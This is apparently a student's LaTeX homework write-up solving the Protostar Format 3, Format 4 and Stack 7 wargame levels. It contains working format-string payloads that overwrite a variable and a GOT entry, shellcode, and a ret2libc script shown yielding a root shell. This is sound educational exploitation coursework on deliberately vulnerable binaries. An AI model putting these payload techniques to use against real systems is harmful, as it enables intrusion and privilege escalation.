% Just ignore everything between this and the next commented line!

\documentclass[12pt]{article}
 \usepackage[margin=1in]{geometry} 
 \usepackage[usenames,dvipsnames]{xcolor}
\usepackage{amsmath,amsthm,amssymb,amsfonts, 
hyperref, color, graphicx,ulem}
\usepackage{minted}
\usepackage{xcolor} % to access the named colour LightGray
\definecolor{LightGray}{gray}{0.9}
\usepackage{datetime}
\newcommand{\N}{\mathbb{N}}
\newcommand{\Z}{\mathbb{Z}}
\newcommand{\Q}{\mathbb{Q}}
\newcommand{\mm}{\textcolor{blue}{You need to use math mode whenever you are writing logic symbols, variables, sets etc. and you need to use text whenever you are writing words. If you are not sure what this means, please speak to me.}}
\newcommand{\al}{\textcolor{blue}{You might try the align environment as shown below: 
\begin{align*}
y=&a+b+a\\
=&2a+b
\end{align*}
The \& symbol allows you to line up the ='s or anything else you want to line up! It also saves you the space between lines of display style equation!}}
\newcommand{\steps}{\textcolor{blue}{You need to use the claim environment to give a claim, then close that and use the proof environment to give your proof.}}
\newcommand{\nproof}{\textcolor{blue}{I see what you are trying to say, but this is not a proof. Please see me if you do not understand what I mean by this.}}
\newcommand{\equal}{\textcolor{blue}{You can only use ``='' between two things which are actually equal. This is not just a way of stringing things together!}}
\newcommand{\mul}{\textcolor{blue}{This is not a valid way of denoting multiplication. You can use $\times$ or $\cdot$, or often the implied multiplication of adjacent variables.}}
\newcommand{\ex}{\textcolor{blue}{You cannot just give one example. You are tasked with showing that this claim holds for all possible values.}}
\newcommand{\thus}{\textcolor{blue}{``therefore'', ``thus", and other words of this flavor should be used only when the preceding sentence leads us to the following sentence. It is not just a way to string things together!}}
\newcommand{\words}{\textcolor{blue}{You need punctuation and words. Remember a proof is supposed to walk the reader through your thought process.}}
\newcommand{\order}{\textcolor{blue}{As a general rule, if the sentences can be reorganized and the proof doesn't make significantly less sense, then it is probably not very well structured! The arguments should flow into each other. Generally sentences should justify each other and you should feel like you are building one thought on top of another.}}
\newcommand{\pr}{\textcolor{blue}{Proofread!}}
\newcommand{\sen}{\textcolor{blue}{You can't start a sentence with a symbol.}}
\newcommand\score[1]{\textcolor{blue}{\textbf{ (score: #1) }}}
\newcommand\blue[1]{\textcolor{blue}{#1}}
\let\div\undefined
\DeclareMathOperator{\div}{div}
\DeclareMathOperator{\dom}{dom}
\DeclareMathOperator{\im}{im}
\newenvironment{problem}[2][Problem]{\begin{trivlist}
\item[\hskip \labelsep {\bfseries #1}\hskip \labelsep {\bfseries #2.}]}{\end{trivlist}}
\newenvironment{claim}[2][Claim]{\begin{trivlist}
\item[\hskip \labelsep {\bfseries #1}\hskip \labelsep {\bfseries #2.}]}{\end{trivlist}}

% You can ignore all the code written above. Most of it is so I can make common comments on your work easily and quickly.
 
\begin{document}
 
\title{Homework 2}
\author{Ng Tze Kean}
\author{StudentID: 721370290002}
\date{\today; \currenttime}
% Add your name in above
\maketitle

% Do not make any additional changes to the title. The date will just tell me when you last compiled and you will not be penalized for a funny date.

 
% Notice that this text is not visible when you compile? The "%" symbol comments out everything after it! This allows you to write notes to yourself that won't appear in the document. Of course, you need to take out the "%" when you want it to start showing up!

\newcommand{\code}{\texttt}

    
\begin{center}\begin{LARGE}Format 3\end{LARGE}\end{center}
 
\subsection*{Problem}

We can see that the problem is similar to format 2, but this time we need to
carefully modify the variable in memory such that in the compare statement we
have the required 4 bytes value.

\begin{lstlisting}[language=bash]
objdump -t format3 | grep target
080496f4 g     O .bss   00000004              target
\end{lstlisting}

Similarly we find the memory location of target again. We now will begin
injecting some string format to test the output of the program.

\subsection*{Idea and Attack process}

\begin{lstlisting}[language=bash]
python -c "print 'AAAA' + '%x.'*15" | ./format3
AAAA0.bffffad0.b7fd7ff4.0.0.bffffcd8.804849d.bffffad0.200.b7fd8420.bffffb14.41414141.252e7825.78252e78.2e78252e.
target is 00000000 :(
\end{lstlisting}

We run the above code to first find out where in memory does the input reside in.
Having found the location, we will now inject the memory location of target and
we will also modify the format specifier which resides at the location of the string.

\begin{lstlisting}[language=bash]
python -c "print '\xf4\x96\x04\x08' + '%x.'*11 + '%n'" | ./format3
0.bffffad0.b7fd7ff4.0.0.bffffcd8.804849d.bffffad0.200.b7fd8420.bffffb14.
target is 0000004c :(
\end{lstlisting}

Now that we can see there is some modifications to the target variable, we want
to write a specific value of $0x01025544$ using this pointer. This a 4byte value
to be written. We can conclude that we have to write this value to 4 memory
location from $0x080496f4$ to \lstinline|0x080496f7|.

Searching online, we can see that it is possible to modify the values of multiple
memory location using the following line of code.

\begin{lstlisting}[language=bash]
python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08' + '%x.'*11 + '%n%n%n%n'" | ./format3
target is 58585858 :(
\end{lstlisting}

Now that we are able to confirm that we can modify the target variable, we will
try to inject the values that we want to write to these memory location. We
structure the attack such that it is based on groups of [Value, Address]. We
repeat this structure for the 4 bytes that we want to write, to inject the value
we use "\%u" as a mechanism to obtain the needed value and "\%n" to inject the value
into the memory location. We refer to the short python calculate in this website,
https://xavibel.com/2020/11/22/protostar-format-strings-level-3/ to obtain the
offset needed. Computing the values, we are able to create our format attack string.

\begin{lstlisting}[language=bash]
python -c "print '\x01\x01\x01\x01\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08' + '%x.'*11 + '%220u%n%17u%n%173u%n%255u%n'" | ./format3
0.bffffad0.b7fd7ff4.0.0.bffffcd8.804849d.bffffad0.200.b7fd8420.bffffb14...
you have modified the target :)
\end{lstlisting}

\subsection*{Source code}

\begin{lstlisting}[language=c]
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
\end{lstlisting}

    \newpage
    
\begin{center}\begin{LARGE}Format 4\end{LARGE}\end{center}
 
\subsection*{Problem}

We look at our source code and see that the end goal is to call the
\lstinline|hello()| function. We see that there is a exit call in \lstinline|vuln|
which we will try to exploit. There is a concept called Global Offset Table (GOT)
which we will attempt.

\begin{lstlisting}[language=bash]
objdump -TR format4 | grep exit
>>>00000000      DF *UND*  00000000  GLIBC_2.0   _exit
>>>00000000      DF *UND*  00000000  GLIBC_2.0   exit
>>>08049718 R_386_JUMP_SLOT   _exit
>>>08049724 R_386_JUMP_SLOT   exit

objdump -t format4 | grep hello
>>>080484b4 g     F .text  0000001e              hello
\end{lstlisting}

Calling objdump, we locate the address of \lstinline|exit| call to be at 
\lstinline|08049724| and the target function \lstinline|hello| to be at
\lstinline|080484b4|.

\subsection*{Idea and Attack process}

We follow the same attack idea as before. We first need to locate the input string
that resides on the stack. Which we will see is 3 offset.

\begin{lstlisting}[language=bash]
python -c "print 'AAAA' + '%x.'*10" | ./format4
AAAA200.b7fd8420.bffffb14.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
\end{lstlisting}

Now that we have the offset, we will follow how we modified the address location
in format3. The idea is to use the same \lstinline|[Value, Address]| pattern
with the needed value offset to inject into the address location. We use the same
python code that we used to compute the needed offset. We then place the offset
into the end os the format string followed by the "\%n" which will write the
value to memory.

\begin{lstlisting}[language=bash]
python -c "print '\x01\x01\x01\x01\x24\x97\x04\x08\x01\x01\x01\x01\x25\x97\x04
  \x08\x01\x01\x01\x01\x26\x97\x04\x08\x01\x01\x01\x01\x27\x97\x04\x08'
  + '%x.'*3 + '%126u%n%208u%n%128u%n%260u%n'" | ./format4
$%&'200.b7fd8420.bffffb14....
code execution redirected! you win  
\end{lstlisting}

\subsection*{Source code}

\begin{lstlisting}[language=c]
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
\end{lstlisting}

    \newpage
     \begin{center}\begin{LARGE}Stack 7\end{LARGE}\end{center}
 
\subsection*{Problem}

\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
Dump of assembler code for function getpath:
0x080484c4 <getpath+0>: push   ebp
0x080484c5 <getpath+1>: mov    ebp,esp
0x080484c7 <getpath+3>: sub    esp,0x68
0x080484ca <getpath+6>: mov    eax,0x8048620
0x080484cf <getpath+11>:        mov    DWORD PTR [esp],eax
0x080484d2 <getpath+14>:        call   0x80483e4 <printf@plt>
0x080484d7 <getpath+19>:        mov    eax,ds:0x8049780
0x080484dc <getpath+24>:        mov    DWORD PTR [esp],eax
0x080484df <getpath+27>:        call   0x80483d4 <fflush@plt>
0x080484e4 <getpath+32>:        lea    eax,[ebp-0x4c]
0x080484e7 <getpath+35>:        mov    DWORD PTR [esp],eax
0x080484ea <getpath+38>:        call   0x80483a4 <gets@plt>
0x080484ef <getpath+43>:        mov    eax,DWORD PTR [ebp+0x4]
0x080484f2 <getpath+46>:        mov    DWORD PTR [ebp-0xc],eax
0x080484f5 <getpath+49>:        mov    eax,DWORD PTR [ebp-0xc]
0x080484f8 <getpath+52>:        and    eax,0xb0000000
0x080484fd <getpath+57>:        cmp    eax,0xb0000000
0x08048502 <getpath+62>:        jne    0x8048524 <getpath+96>
0x08048504 <getpath+64>:        mov    eax,0x8048634
0x08048509 <getpath+69>:        mov    edx,DWORD PTR [ebp-0xc]
0x0804850c <getpath+72>:        mov    DWORD PTR [esp+0x4],edx
0x08048510 <getpath+76>:        mov    DWORD PTR [esp],eax
0x08048513 <getpath+79>:        call   0x80483e4 <printf@plt>
0x08048518 <getpath+84>:        mov    DWORD PTR [esp],0x1
0x0804851f <getpath+91>:        call   0x80483c4 <_exit@plt>
0x08048524 <getpath+96>:        mov    eax,0x8048640
0x08048529 <getpath+101>:       lea    edx,[ebp-0x4c]
0x0804852c <getpath+104>:       mov    DWORD PTR [esp+0x4],edx
0x08048530 <getpath+108>:       mov    DWORD PTR [esp],eax
0x08048533 <getpath+111>:       call   0x80483e4 <printf@plt>
0x08048538 <getpath+116>:       lea    eax,[ebp-0x4c]
0x0804853b <getpath+119>:       mov    DWORD PTR [esp],eax
0x0804853e <getpath+122>:       call   0x80483f4 <strdup@plt>
0x08048543 <getpath+127>:       leave
0x08048544 <getpath+128>:       ret
End of assembler dump.
\end{minted}

\subsection*{Idea and Attack process}

We try to find the offset for the target by injecting the string below. Based on the segmentation fault message we can deduce that the offset needed is 80bytes.

\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos, breaklines ] {bash}
./stack7
>>>input path please: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0
Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1
Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2
Ag3Ag4Ag5Ag
>>Program received signal SIGSEGV, Segmentation fault.
>>0x37634136 in ?? ()
\end{minted}

\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos, breaklines] {python}
import struct
filler = "1" * 80
addr_hop = struct.pack("I", 0x08048544)
addr_code = struct.pack("I", 0xbffffcb4+256)
nop = "\x90"*528
code =  "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\
x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\
x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\
xcd\x80"
print filler+addr_hop+addr_code+nop+code
\end{minted}

We run the code below and we realise that the exploit is not working even after increase the nop sled. We try to find another way perhaps ret2libc.

\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
vim stack7_py.py
python stack7_py.py > /tmp/payload
(python stack7_py.py; cat) | ./stack7
\end{minted}

Lets try to find the address of the lib-c. We use the following commands to obtain the necessary information.

\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
info proc map
>>>process 6855
>>>cmdline = '/opt/protostar/bin/stack7'
>>>cwd = '/opt/protostar/bin'
>>>exe = '/opt/protostar/bin/stack7'
>>>Mapped address spaces:
>>>
>>>        Start Addr   End Addr       Size     Offset objfile
>>>         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack7
>>>         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack7
>>>        0xb7e96000 0xb7e97000     0x1000          0
>>>        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
>>>        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
>>>        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
>>>        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
>>>        0xb7fd9000 0xb7fdc000     0x3000          0
>>>        0xb7fde000 0xb7fe2000     0x4000          0
>>>        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
>>>        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
>>>        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
>>>        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
>>>        0xbffeb000 0xc0000000    0x15000          0           [stack]

p system
>>>$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
p exit
>>>$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
\end{minted}

We note that the base address of lib-c is `0xb7e97000`.

We identify the location of the `system` command in lib-c to invoke it during the attack. The `exit` command is used so that the attack exits gracefully once we exit the shell. The `system` command takes in parameters to run, we want to pass in the `\\bin\\sh` command to system, one way is to use the address in lib-c that contains it. Through checking lib-c, we find the offset to the string and use it with the base address to obtain the pointer to the string. We should note that the structure of the stack is as follow below which we are trying to emulate. The system call will obtain the parameter 8bytes below ebp, which is past the old ebp and the return address.

\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
function address (system call)
return address (exit call)
parameters (/bin/sh)
\end{minted}

With the plan in place, we create the following script and run it.

\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {python}
import struct

filler = "1" * 80
addr_hop = struct.pack("I", 0x08048544)
libc_start = 0xb7e97000
string_offset = 0x11f3bf
bin_addr = struct.pack("I", libc_start + string_offset)
system_addr = struct.pack("I", 0xb7ecffb0)
exit_addr = struct.pack("I", 0xb7ec60c0)

print filler + addr_hop + system_addr + exit_addr + bin_addr
\end{minted}

We run the following script, this time since we want to hold the shell open, we pass in the script as such whereby after the `cat` command, we pass a `-` such that the terminal holds the shell open for us to pass in other commands. Reference `cat` command using `man` -> (cat f - g  Output f's contents, then standard input, then g's contents.)

\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
whoami
>>>user
vim stack7_py.py
python stack7_py.py > /tmp/payload
cat /tmp/payload - | ./stack7
whoami
>>>root
\end{minted}

\subsection*{Source code}

\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
\end{minted}

    \newpage
    

\end{document}